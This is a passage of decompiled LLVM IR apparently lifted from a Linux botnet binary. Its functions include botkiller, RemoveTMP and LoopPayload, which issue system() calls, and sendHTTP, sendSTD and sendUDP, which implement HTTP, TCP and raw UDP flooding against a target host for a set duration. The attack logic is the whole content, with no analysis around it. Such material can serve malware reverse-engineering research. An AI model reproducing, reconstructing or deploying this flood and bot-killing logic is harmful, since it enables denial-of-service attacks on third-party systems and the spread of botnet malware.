  store i32 53413, i32* @r3, align 4
  %v1_100090d8 = call i32 @htons(i32 53413)
  store i32 %v2_1000910c, i32* @r3, align 4
  store i32 268472620, i32* @lr, align 4
  %v6_10009128 = call i32 @sprintf(i32 %v2_1000910c, i32 ptrtoint ([327 x i8]* @global_var_10016fe0.280 to i32), i32 ptrtoint ([3 x i8]* @global_var_10017128.281 to i32), i32 268500992)
  store i32 %v2_1000910c, i32* @r3, align 4
  %v0_10009134 = call i32 @__GI_strlen()
  store i32 268472672, i32* @lr, align 4
  %v6_1000915c = call i32 @__libc_sendto(i32 %v3_100090b0, i32 %v2_1000910c, i32 %v0_10009134, i32 0, i32 %v2_1000913c, i32 16)
  br label %dec_label_pc_100090a4

; uselistorder directives
  uselistorder i32 %v2_1000910c, { 0, 2, 1, 3 }
}

define i32 @LoopPayload(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10009164 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10009164, i32* %stack_var_-32, align 4
  %v5_10009164 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v5_10009164, i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_10009198.283 to i32), i32* @lr, align 4
  %v2_10009194 = call i32 @__libc_system(i32 ptrtoint ([320 x i8]* @global_var_10017130.282 to i32))
  ret i32 %v2_10009194

; uselistorder directives
  uselistorder i32* %stack_var_-32, { 1, 0 }
}

define i32 @botkiller(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-232 = alloca i32, align 4
  %stack_var_-520 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-376 = alloca i32, align 4
  %stack_var_-468 = alloca i32, align 4
  %stack_var_-508 = alloca i32, align 4
  %v2_100091e0 = ptrtoint i32* %stack_var_-508 to i32
  store i32 %v2_100091e0, i32* @r3, align 4
  store i32 ptrtoint ([9 x i8*]* @global_var_10017450.293 to i32), i32* @r4, align 4
  store i32 40, i32* @r5, align 4
  store i32 268472824, i32* @lr, align 4
  %v0_100091f4 = call i32 @memcpy()
  %v2_10009200 = ptrtoint i32* %stack_var_-468 to i32
  store i32 %v2_10009200, i32* @r3, align 4
  store i32 ptrtoint ([23 x i8*]* @global_var_1001739c.316 to i32), i32* @r4, align 4
  store i32 92, i32* @r5, align 4
  store i32 268472856, i32* @lr, align 4
  %v0_10009214 = call i32 @memcpy()
  %v2_10009220 = ptrtoint i32* %stack_var_-376 to i32
  store i32 %v2_10009220, i32* @r3, align 4
  store i32 ptrtoint ([16 x i8*]* @global_var_100172f8.326 to i32), i32* @r4, align 4
  store i32 64, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10009238.327 to i32), i32* @lr, align 4
  %v0_10009234 = call i32 @memcpy()
  store i32 0, i32* %stack_var_-520, align 4
  %tmp14 = icmp slt i32 %tmp, 1
  br i1 %tmp14, label %dec_label_pc_100093e0, label %dec_label_pc_10009390

dec_label_pc_10009390:                            ; preds = %entry
  %v2_10009250 = ptrtoint i32* %stack_var_-152 to i32
  store i32 268472936, i32* @lr, align 4
  %v3_10009264 = call i32 @__GI_memset(i32 %v2_10009250, i32 0, i32 128)
  %v2_1000927c = ptrtoint i32* %stack_var_-520 to i32
  %v2_10009280 = add i32 %v2_1000927c, 12
  %v1_10009288 = inttoptr i32 %v2_10009280 to i32*
  %v2_10009288 = load i32, i32* %v1_10009288, align 4
  %v2_100092e0 = add i32 %v2_1000927c, 144
  store i32 %v2_10009250, i32* @r3, align 4
  store i32 127, i32* @r4, align 4
  store i32 ptrtoint ([100 x i8]* @global_var_10017478.328 to i32), i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1000931c.329 to i32), i32* @lr, align 4
  %v8_10009318 = call i32 @__GI_snprintf(i32 %v2_10009250, i32 127, i32 ptrtoint ([100 x i8]* @global_var_10017478.328 to i32), i32 %v2_10009288, i32 %v2_10009288, i32 %v2_10009288, i32 %v2_10009288)
  store i32 268473244, i32* @lr, align 4
  %v1_10009398 = call i32 @__libc_system(i32 %v2_10009250)
  %v3_1000939c = load i32, i32* %stack_var_-520, align 4
  %v1_100093a0 = mul i32 %v3_1000939c, 4
  %v1_100093ac = add i32 %v1_100093a0, %v2_100092e0
  %v1_100093b0 = inttoptr i32 %v1_100093ac to i32*
  %v2_100093b0 = load i32, i32* %v1_100093b0, align 4
  %v2_100093b4 = ptrtoint i32* %stack_var_-232 to i32
  store i32 %v2_100093b4, i32* @r3, align 4
  store i32 268473296, i32* @lr, align 4
  %v5_100093cc = call i32 @sprintf(i32 %v2_100093b4, i32 ptrtoint ([14 x i8]* @global_var_100174fc.331 to i32), i32 %v2_100093b0, i32 268500992)
  store i32 ptrtoint (i32* @global_var_100093dc.332 to i32), i32* @lr, align 4
  %v1_100093d8 = call i32 @__libc_system(i32 %v2_100093b4)
  br label %dec_label_pc_100093e8

dec_label_pc_100093e0:                            ; preds = %entry
  store i32 268473320, i32* @lr, align 4
  %v1_100093e4 = call i32 @sleep(i32 5)
  br label %dec_label_pc_100093e8

dec_label_pc_100093e8:                            ; preds = %dec_label_pc_10009390, %dec_label_pc_100093e0
  %storemerge1 = phi i32 [ %v1_100093e4, %dec_label_pc_100093e0 ], [ %v1_100093d8, %dec_label_pc_10009390 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v2_100093b4, { 1, 0, 2 }
  uselistorder i32 %v2_10009250, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-520, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100093e8, { 1, 0 }
}

define i32 @RemoveTMP(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10009408 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10009408, i32* %stack_var_-16, align 4
  %v5_10009408 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v5_10009408, i32* @r31, align 4
  store i32 268473384, i32* @lr, align 4
  %v2_10009424 = call i32 @__libc_system(i32 ptrtoint ([43 x i8]* @global_var_1001750c.333 to i32))
  store i32 268473396, i32* @lr, align 4
  %v2_10009430 = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_10017538.334 to i32))
  store i32 268473408, i32* @lr, align 4
  %v2_1000943c = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_10017550.335 to i32))
  store i32 268473420, i32* @lr, align 4
  %v2_10009448 = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_10017538.334 to i32))
  store i32 268473432, i32* @lr, align 4
  %v2_10009454 = call i32 @__libc_system(i32 ptrtoint ([14 x i8]* @global_var_10017568.336 to i32))
  store i32 268473444, i32* @lr, align 4
  %v2_10009460 = call i32 @__libc_system(i32 ptrtoint ([11 x i8]* @global_var_10017578.337 to i32))
  store i32 268473456, i32* @lr, align 4
  %v2_1000946c = call i32 @__libc_system(i32 ptrtoint ([23 x i8]* @global_var_10017584.338 to i32))
  store i32 268473468, i32* @lr, align 4
  %v2_10009478 = call i32 @__libc_system(i32 ptrtoint ([20 x i8]* @global_var_1001759c.339 to i32))
  store i32 268473480, i32* @lr, align 4
  %v2_10009484 = call i32 @__libc_system(i32 ptrtoint ([11 x i8]* @global_var_100175b0.340 to i32))
  store i32 268473492, i32* @lr, align 4
  %v2_10009490 = call i32 @__libc_system(i32 ptrtoint ([17 x i8]* @global_var_100175bc.341 to i32))
  store i32 268473504, i32* @lr, align 4
  %v2_1000949c = call i32 @__libc_system(i32 ptrtoint ([14 x i8]* @global_var_100175d0.342 to i32))
  store i32 268473516, i32* @lr, align 4
  %v2_100094a8 = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_100175e0.343 to i32))
  store i32 268473528, i32* @lr, align 4
  %v2_100094b4 = call i32 @__libc_system(i32 ptrtoint ([36 x i8]* @global_var_100175f8.344 to i32))
  ret i32 %v2_100094b4

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32 (i32)* @__libc_system, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  store i32 1, i32* %stack_var_-32, align 4
  store i32 268473600, i32* @lr, align 4
  %v1_100094fc = call i32 @__GI_gethostbyname(i32 %arg1)
  %v3_1000950c = icmp eq i32 %v1_100094fc, 0
  br i1 %v3_1000950c, label %dec_label_pc_10009514, label %dec_label_pc_10009520

dec_label_pc_10009514:                            ; preds = %entry
  br label %dec_label_pc_100095f8

dec_label_pc_10009520:                            ; preds = %entry
  %v1_10009524 = add i32 %v1_100094fc, 16
  %v2_10009524 = inttoptr i32 %v1_10009524 to i32*
  %v3_10009524 = load i32, i32* %v2_10009524, align 4
  %v1_10009528 = inttoptr i32 %v3_10009524 to i32*
  %v2_10009528 = load i32, i32* %v1_10009528, align 4
  %v1_10009530 = add i32 %v1_100094fc, 12
  %v2_10009530 = inttoptr i32 %v1_10009530 to i32*
  %v3_10009530 = load i32, i32* %v2_10009530, align 4
  %v2_10009538 = ptrtoint i32* %stack_var_-48 to i32
  %v2_1000953c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v3_10009530, i32* @r5, align 4
  store i32 268473680, i32* @lr, align 4
  %v4_1000954c = call i32 @bcopy(i32 %v2_10009528, i32 %v2_1000953c, i32 %v3_10009530, i32 %v2_10009538)
  %v4_10009550 = zext i16 %arg2 to i32
  store i32 %v4_10009550, i32* @r3, align 4
  %v1_1000955c = call i32 @htons(i32 %v4_10009550)
  store i32 2, i32* %stack_var_-48, align 4
  store i32 268473728, i32* @lr, align 4
  %v3_1000957c = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_10009588 = ptrtoint i32* %stack_var_-32 to i32
  store i32 268473764, i32* @lr, align 4
  %v5_100095a0 = call i32 @__GI_setsockopt(i32 %v3_1000957c, i32 6, i32 1, i32 %v2_10009588, i32 4)
  %v4_100095ac = icmp eq i32 %v3_1000957c, -1
  br i1 %v4_100095ac, label %dec_label_pc_100095b4, label %dec_label_pc_100095c0

dec_label_pc_100095b4:                            ; preds = %dec_label_pc_10009520
  br label %dec_label_pc_100095f8

dec_label_pc_100095c0:                            ; preds = %dec_label_pc_10009520
  store i32 268473812, i32* @lr, align 4
  %v3_100095d0 = call i32 @__libc_connect(i32 %v3_1000957c, i32 %v2_10009538, i32 16)
  %v4_100095dc = icmp eq i32 %v3_100095d0, -1
  br i1 %v4_100095dc, label %dec_label_pc_100095e4, label %dec_label_pc_100095f0

dec_label_pc_100095e4:                            ; preds = %dec_label_pc_100095c0
  br label %dec_label_pc_100095f8

dec_label_pc_100095f0:                            ; preds = %dec_label_pc_100095c0
  br label %dec_label_pc_100095f8

dec_label_pc_100095f8:                            ; preds = %dec_label_pc_100095e4, %dec_label_pc_100095b4, %dec_label_pc_10009514, %dec_label_pc_100095f0
  %stack_var_-16.0 = phi i32 [ 0, %dec_label_pc_10009514 ], [ 0, %dec_label_pc_100095b4 ], [ 0, %dec_label_pc_100095e4 ], [ %v3_1000957c, %dec_label_pc_100095f0 ]
  ret i32 %stack_var_-16.0

; uselistorder directives
  uselistorder i32 %v2_10009538, { 1, 0 }
  uselistorder i32 %v3_10009530, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_100095f8, { 3, 0, 1, 2 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-568 = alloca i32, align 4
  %stack_var_-840 = alloca i32, align 4
  %stack_var_-828 = alloca i32, align 4
  %v2_10009654 = ptrtoint i32* %stack_var_-828 to i32
  store i32 %v2_10009654, i32* @r3, align 4
  store i32 ptrtoint ([62 x i8*]* @global_var_100189a4.407 to i32), i32* @r4, align 4
  store i32 248, i32* @r5, align 4
  store i32 268473964, i32* @lr, align 4
  %v0_10009668 = call i32 @memcpy()
  store i32 268474004, i32* @lr, align 4
  %v1_10009690 = call i32 @__GI_time(i32 0)
  %v2_1000969c = add i32 %v1_10009690, %arg5
  store i32 268474024, i32* @lr, align 4
  %v0_100096a4 = call i32 @random()
  store i32 268474096, i32* @lr, align 4
  %v0_100096ec = call i32 @random()
  %v2_10009738 = ptrtoint i32* %stack_var_-568 to i32
  store i32 %v2_10009738, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10009760.415 to i32), i32* @lr, align 4
  %v9_1000975c = call i32 @sprintf(i32 %v2_10009738, i32 ptrtoint ([62 x i8]* @global_var_10018a9c.414 to i32), i32 %arg2, i32 %arg4)
  %v2_1000980c8 = icmp sgt i32 %arg6, 0
  br i1 %v2_1000980c8, label %dec_label_pc_1000976c.lr.ph, label %dec_label_pc_10009814

dec_label_pc_1000976c.lr.ph:                      ; preds = %entry
  br label %dec_label_pc_1000976c

dec_label_pc_1000976c:                            ; preds = %dec_label_pc_1000976c.lr.ph, %dec_label_pc_100097f8
  %storemerge311 = phi i32 [ 0, %dec_label_pc_1000976c.lr.ph ], [ %v1_100097fc, %dec_label_pc_100097f8 ]
  store i32 268474224, i32* @lr, align 4
  %v0_1000976c = call i32 @__libc_fork()
  %v3_10009774 = icmp eq i32 %v0_1000976c, 0
  br i1 %v3_10009774, label %dec_label_pc_100097f8, label %dec_label_pc_100097d8.preheader

dec_label_pc_100097d8.preheader:                  ; preds = %dec_label_pc_1000976c
  store i32 268474336, i32* @lr, align 4
  %v1_100097dc4 = call i32 @__GI_time(i32 0)
  %v2_100097e85 = icmp slt i32 %v1_100097dc4, %v2_1000969c
  br i1 %v2_100097e85, label %dec_label_pc_10009780, label %dec_label_pc_100097f0

dec_label_pc_10009780:                            ; preds = %dec_label_pc_100097d8.preheader, %dec_label_pc_100097d8.backedge
  %v3_10009794 = call i32 @socket_connect(i32 %arg1, i16 %arg3)
  store i32 %v3_10009794, i32* %stack_var_-840, align 4
  %v3_100097a4 = icmp eq i32 %v3_10009794, 0
  br i1 %v3_100097a4, label %dec_label_pc_100097d8.backedge, label %dec_label_pc_100097ac

dec_label_pc_100097ac:                            ; preds = %dec_label_pc_10009780
  store i32 %v2_10009738, i32* @r3, align 4
  %v0_100097b4 = call i32 @__GI_strlen()
  %v3_100097c0 = load i32, i32* %stack_var_-840, align 4
  store i32 268474320, i32* @lr, align 4
  %v2_100097cc = call i32 @__libc_write(i32 %v3_100097c0, i32 %v2_10009738)
  store i32 ptrtoint ([3 x i8]* @global_var_100097d8.416 to i32), i32* @lr, align 4
  %v1_100097d4 = call i32 @__libc_close(i32 %v3_100097c0)
  br label %dec_label_pc_100097d8.backedge

dec_label_pc_100097d8.backedge:                   ; preds = %dec_label_pc_100097ac, %dec_label_pc_10009780
  store i32 268474336, i32* @lr, align 4
  %v1_100097dc = call i32 @__GI_time(i32 0)
  %v2_100097e8 = icmp slt i32 %v1_100097dc, %v2_1000969c
  br i1 %v2_100097e8, label %dec_label_pc_10009780, label %dec_label_pc_100097f0

dec_label_pc_100097f0:                            ; preds = %dec_label_pc_100097d8.backedge, %dec_label_pc_100097d8.preheader
  %v1_100097f4 = call i32 @__GI__exit(i32 1)
  br label %dec_label_pc_100097f8

dec_label_pc_100097f8:                            ; preds = %dec_label_pc_1000976c, %dec_label_pc_100097f0
  %v0_1000982c13 = phi i32 [ 0, %dec_label_pc_1000976c ], [ %v1_100097f4, %dec_label_pc_100097f0 ]
  %v1_100097fc = add nuw nsw i32 %storemerge311, 1
  %v2_1000980c = icmp slt i32 %v1_100097fc, %arg6
  br i1 %v2_1000980c, label %dec_label_pc_1000976c, label %dec_label_pc_10009814

dec_label_pc_10009814:                            ; preds = %dec_label_pc_100097f8, %entry
  %v0_1000982c = phi i32 [ %v9_1000975c, %entry ], [ %v0_1000982c13, %dec_label_pc_100097f8 ]
  ret i32 %v0_1000982c

; uselistorder directives
  uselistorder i32 %v2_10009738, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1000969c, { 1, 0 }
  uselistorder i32 268474336, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_100097f8, { 1, 0 }
  uselistorder label %dec_label_pc_10009780, { 1, 0 }
  uselistorder label %dec_label_pc_1000976c, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  store i32 268474464, i32* @lr, align 4
  %v3_1000985c = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 268474480, i32* @lr, align 4
  %v1_1000986c = call i32 @__GI_time(i32 0)
  store i32 268474500, i32* @lr, align 4
  %v1_10009880 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_1000988c = ptrtoint i32* %stack_var_-196 to i32
  store i32 0, i32* %stack_var_-196, align 4
  store i32 0, i32* %stack_var_-192, align 4
  %v1_100098b4 = add i32 %v1_10009880, 16
  %v2_100098b4 = inttoptr i32 %v1_100098b4 to i32*
  %v3_100098b4 = load i32, i32* %v2_100098b4, align 4
  %v1_100098b8 = inttoptr i32 %v3_100098b4 to i32*
  %v2_100098b8 = load i32, i32* %v1_100098b8, align 4
  %v2_100098c0 = ptrtoint i32* %stack_var_-192 to i32
  %v1_100098c8 = add i32 %v1_10009880, 12
  %v2_100098c8 = inttoptr i32 %v1_100098c8 to i32*
  %v3_100098c8 = load i32, i32* %v2_100098c8, align 4
  store i32 %v3_100098c8, i32* @r5, align 4
  store i32 268474588, i32* @lr, align 4
  %v4_100098d8 = call i32 @bcopy(i32 %v2_100098b8, i32 %v2_100098c0, i32 %v3_100098c8, i32 %v1_10009880)
  %v1_100098e0 = add i32 %v1_10009880, 8
  %v2_100098e0 = inttoptr i32 %v1_100098e0 to i32*
  %v3_100098e0 = load i32, i32* %v2_100098e0, align 4
  %v1_100098e4 = urem i32 %v3_100098e0, 65536
  store i32 %v1_100098e4, i32* %stack_var_-196, align 4
  %v2_10009908 = ptrtoint i32* %stack_var_-180 to i32
  %v2_10009958 = ptrtoint i32* %stack_var_-216 to i32
  %v2_1000995c = add i32 %v2_10009958, 36
  %v2_100099b4 = add i32 %v1_1000986c, %arg3
  br label %dec_label_pc_10009900

dec_label_pc_10009900:                            ; preds = %dec_label_pc_100099d8, %entry
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_100099dc, %dec_label_pc_100099d8 ]
  store i32 %v2_10009908, i32* @r3, align 4
  store i32 ptrtoint ([36 x i8*]* @global_var_10018c98.453 to i32), i32* @r4, align 4
  store i32 144, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10009920.454 to i32), i32* @lr, align 4
  %v0_1000991c = call i32 @memcpy()
  store i32 268474660, i32* @lr, align 4
  %v0_10009920 = call i32 @random()
  %v1_10009938 = urem i32 %v0_10009920, 36
  %v1_10009954 = mul nuw nsw i32 %v1_10009938, 4
  %v1_10009960 = add i32 %v2_1000995c, %v1_10009954
  %v1_10009964 = inttoptr i32 %v1_10009960 to i32*
  %v2_10009964 = load i32, i32* %v1_10009964, align 4
  store i32 %v2_10009964, i32* %stack_var_-216, align 4
  %tmp23 = icmp ult i32 %storemerge3, 50
  br i1 %tmp23, label %dec_label_pc_100099d8, label %dec_label_pc_10009978

dec_label_pc_10009978:                            ; preds = %dec_label_pc_10009900
  store i32 268474764, i32* @lr, align 4
  %v4_10009988 = call i32 @__libc_send(i32 %v3_1000985c, i32 %v2_10009964, i32 75, i32 0)
  store i32 ptrtoint ([3 x i8]* @global_var_100099a0.455 to i32), i32* @lr, align 4
  %v3_1000999c = call i32 @__libc_connect(i32 %v3_1000985c, i32 %v2_1000988c, i32 16)
  store i32 268474792, i32* @lr, align 4
  %v1_100099a4 = call i32 @__GI_time(i32 0)
  %v2_100099b8 = icmp slt i32 %v1_100099a4, %v2_100099b4
  br i1 %v2_100099b8, label %dec_label_pc_100099d0, label %dec_label_pc_100099c0

dec_label_pc_100099c0:                            ; preds = %dec_label_pc_10009978
  store i32 ptrtoint ([3 x i8]* @global_var_100099c8.456 to i32), i32* @lr, align 4
  %v1_100099c4 = call i32 @__libc_close(i32 %v3_1000985c)
  %v1_100099cc = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_100099d0

dec_label_pc_100099d0:                            ; preds = %dec_label_pc_10009978, %dec_label_pc_100099c0
  br label %dec_label_pc_100099d8

dec_label_pc_100099d8:                            ; preds = %dec_label_pc_10009900, %dec_label_pc_100099d0
  %stack_var_-212.0 = phi i32 [ %storemerge3, %dec_label_pc_10009900 ], [ 0, %dec_label_pc_100099d0 ]
  %v1_100099dc = add i32 %stack_var_-212.0, 1
  br label %dec_label_pc_10009900

; uselistorder directives
  uselistorder i32 %v3_100098c8, { 1, 0 }
  uselistorder i32 %v1_10009880, { 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-192, { 1, 0 }
  uselistorder i32 144, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100099d8, { 1, 0 }
  uselistorder label %dec_label_pc_100099d0, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100099e8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100099e8, i32* %stack_var_-144, align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v3_10009a24 = icmp eq i32 %arg2, 0
  br i1 %v3_10009a24, label %dec_label_pc_10009a2c, label %dec_label_pc_10009a40

dec_label_pc_10009a2c:                            ; preds = %entry
  %v0_10009a2c = call i32 @rand_cmwc()
  br label %dec_label_pc_10009a58

dec_label_pc_10009a40:                            ; preds = %entry
  %v1_10009a44 = urem i32 %arg2, 65536
  store i32 %v1_10009a44, i32* @r3, align 4
  %v1_10009a4c = call i32 @htons(i32 %v1_10009a44)
  br label %dec_label_pc_10009a58

dec_label_pc_10009a58:                            ; preds = %dec_label_pc_10009a2c, %dec_label_pc_10009a40
  %v2_10009a58 = ptrtoint i32* %stack_var_-96 to i32
  %v4_10009a68 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-92, i32 %v2_10009a58)
  %v3_10009a70 = icmp eq i32 %v4_10009a68, 0
  br i1 %v3_10009a70, label %dec_label_pc_10009a78, label %dec_label_pc_10009fcc

dec_label_pc_10009a78:                            ; preds = %dec_label_pc_10009a58
  %v3_10009a9c = icmp eq i32 %arg4, 32
  br i1 %v3_10009a9c, label %dec_label_pc_10009aa4, label %dec_label_pc_10009be0

dec_label_pc_10009aa4:                            ; preds = %dec_label_pc_10009a78
  store i32 268475060, i32* @lr, align 4
  %v3_10009ab0 = call i32 @socket(i32 2, i32 2, i32 17)
  %v3_10009ac0 = icmp eq i32 %v3_10009ab0, 0
  br i1 %v3_10009ac0, label %dec_label_pc_10009ac8, label %dec_label_pc_10009ae8

dec_label_pc_10009ac8:                            ; preds = %dec_label_pc_10009aa4
  %v3_10009acc = load i32, i32* @global_var_1002aba8.30, align 4
  store i32 ptrtoint (i32* @global_var_10009ae4.459 to i32), i32* @lr, align 4
  %v4_10009ae0 = call i32 @HackerPrint(i32 %v3_10009acc, i32 ptrtoint ([27 x i8]* @global_var_10018d28.458 to i32), i32 268566528)
  br label %dec_label_pc_10009fcc

dec_label_pc_10009ae8:                            ; preds = %dec_label_pc_10009aa4
  %v1_10009aec = add i32 %arg5, 1
  store i32 268475128, i32* @lr, align 4
  %v1_10009af4 = call i32 @malloc(i32 %v1_10009aec)
  %v3_10009b04 = icmp eq i32 %v1_10009af4, 0
  br i1 %v3_10009b04, label %dec_label_pc_10009fcc, label %dec_label_pc_10009b0c

dec_label_pc_10009b0c:                            ; preds = %dec_label_pc_10009ae8
  store i32 268475180, i32* @lr, align 4
  %v3_10009b28 = call i32 @__GI_memset(i32 %v1_10009af4, i32 0, i32 %v1_10009aec)
  %v2_10009b34 = call i32 @makeRandomStr(i32 %v1_10009af4, i32 %arg5)
  store i32 268475200, i32* @lr, align 4
  %v1_10009b3c = call i32 @__GI_time(i32 0)
  %v2_10009b48 = add i32 %v1_10009b3c, %arg3
  br label %dec_label_pc_10009b5c

dec_label_pc_10009b5c:                            ; preds = %dec_label_pc_10009bd0, %dec_label_pc_10009bac, %dec_label_pc_10009b0c
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_10009b0c ], [ %v1_10009bd4, %dec_label_pc_10009bd0 ], [ 0, %dec_label_pc_10009bac ]
  store i32 268475264, i32* @lr, align 4
  %v6_10009b7c = call i32 @__libc_sendto(i32 %v3_10009ab0, i32 %v1_10009af4, i32 %arg5, i32 0, i32 %v2_10009a58, i32 16)
  %v4_10009b88 = icmp eq i32 %stack_var_-44.0, %arg6
  br i1 %v4_10009b88, label %dec_label_pc_10009b90, label %dec_label_pc_10009bd0

dec_label_pc_10009b90:                            ; preds = %dec_label_pc_10009b5c
  br i1 %v3_10009a24, label %dec_label_pc_10009b9c, label %dec_label_pc_10009bac

dec_label_pc_10009b9c:                            ; preds = %dec_label_pc_10009b90
  %v0_10009b9c = call i32 @rand_cmwc()
  br label %dec_label_pc_10009bac

dec_label_pc_10009bac:                            ; preds = %dec_label_pc_10009b90, %dec_label_pc_10009b9c
  store i32 268475316, i32* @lr, align 4
  %v1_10009bb0 = call i32 @__GI_time(i32 0)
  %v3_10009bbc = icmp sgt i32 %v1_10009bb0, %v2_10009b48
  br i1 %v3_10009bbc, label %dec_label_pc_10009fcc, label %dec_label_pc_10009b5c

dec_label_pc_10009bd0:                            ; preds = %dec_label_pc_10009b5c
  %v1_10009bd4 = add i32 %stack_var_-44.0, 1
  br label %dec_label_pc_10009b5c

dec_label_pc_10009be0:                            ; preds = %dec_label_pc_10009a78
  store i32 268475384, i32* @lr, align 4
  %v3_10009bf4 = call i32 @socket(i32 2, i32 3, i32 17)
  %v3_10009c04 = icmp eq i32 %v3_10009bf4, 0
  br i1 %v3_10009c04, label %dec_label_pc_10009c0c, label %dec_label_pc_10009c2c

dec_label_pc_10009c0c:                            ; preds = %dec_label_pc_10009be0
  %v3_10009c10 = load i32, i32* @global_var_1002aba8.30, align 4
  store i32 ptrtoint (i32* @global_var_10009c28.461 to i32), i32* @lr, align 4
  %v4_10009c24 = call i32 @HackerPrint(i32 %v3_10009c10, i32 ptrtoint ([27 x i8]* @global_var_10018d28.458 to i32), i32 268566528)
  br label %dec_label_pc_10009fbc

dec_label_pc_10009c2c:                            ; preds = %dec_label_pc_10009be0
  store i32 1, i32* %stack_var_-80, align 4
  %v2_10009c34 = ptrtoint i32* %stack_var_-80 to i32
  store i32 268475472, i32* @lr, align 4
  %v5_10009c4c = call i32 @__GI_setsockopt(i32 %v3_10009bf4, i32 0, i32 3, i32 %v2_10009c34, i32 4)
  %tmp70 = icmp sgt i32 %v5_10009c4c, -1
  br i1 %tmp70, label %dec_label_pc_10009c7c, label %dec_label_pc_10009c5c

dec_label_pc_10009c5c:                            ; preds = %dec_label_pc_10009c2c
  %v3_10009c60 = load i32, i32* @global_var_1002aba8.30, align 4
  store i32 ptrtoint (i32* @global_var_10009c78.463 to i32), i32* @lr, align 4
  %v4_10009c74 = call i32 @HackerPrint(i32 %v3_10009c60, i32 ptrtoint ([33 x i8]* @global_var_10018d44.462 to i32), i32 268566528)
  br label %dec_label_pc_10009fbc

dec_label_pc_10009c7c:                            ; preds = %dec_label_pc_10009c2c
  br label %dec_label_pc_10009c88

dec_label_pc_10009c88:                            ; preds = %dec_label_pc_10009c7c, %dec_label_pc_10009c88
  %v1_10009cc020 = phi i32 [ 49, %dec_label_pc_10009c7c ], [ %v1_10009cc0, %dec_label_pc_10009c88 ]
  store i32 268475536, i32* @lr, align 4
  %v1_10009c8c = call i32 @__GI_time(i32 0)
  %v0_10009c98 = call i32 @rand_cmwc()
  %v2_10009ca0 = xor i32 %v1_10009c8c, %v0_10009c98
  store i32 ptrtoint (i32* @global_var_10009cac.464 to i32), i32* @lr, align 4
  %v1_10009ca8 = call i32 @srand(i32 %v2_10009ca0)
  store i32 268475568, i32* @lr, align 4
  %v0_10009cac = call i32 @random()
  %v1_10009cb8 = call i32 @init_rand(i32 %v0_10009cac)
  %v1_10009cc0 = add nsw i32 %v1_10009cc020, -1
  %v4_10009cd0 = icmp eq i32 %v1_10009cc020, 0
  br i1 %v4_10009cd0, label %dec_label_pc_10009cd8, label %dec_label_pc_10009c88

dec_label_pc_10009cd8:                            ; preds = %dec_label_pc_10009c88
  %v3_10009cdc = icmp eq i32 %arg4, 0
  br i1 %v3_10009cdc, label %dec_label_pc_10009d08, label %dec_label_pc_10009cf0

dec_label_pc_10009cf0:                            ; preds = %dec_label_pc_10009cd8
  br label %dec_label_pc_10009d08

dec_label_pc_10009d08:                            ; preds = %dec_label_pc_10009cd8, %dec_label_pc_10009cf0
  %v1_10009d0c = add i32 %arg5, 28
  %v1_10009d1c = add i32 %arg5, 58
  %v1_10009d20 = and i32 %v1_10009d1c, -16
  %v2_10009d28 = load i32, i32* %stack_var_-144, align 4
